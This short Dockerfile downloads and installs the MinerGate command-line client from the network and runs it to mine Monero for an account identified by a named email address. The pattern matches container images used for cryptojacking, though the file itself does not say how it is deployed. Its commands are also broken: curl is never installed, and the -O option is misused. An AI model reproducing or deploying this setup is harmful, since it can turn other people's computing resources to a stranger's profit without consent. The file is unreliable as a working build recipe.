FROM ubuntu:latest
RUN ["apt", "update"]
RUN ["curl", "https://download.minergate.com/ubuntu-cli", "-O", "minergate-cli-release.deb"]
RUN ["dpkg", "-i", "./minergate-cli-release.deb"]
RUN ["minergate-cli", "-user", "wh0amiofficial@pm.me", "-xmr", "2"]
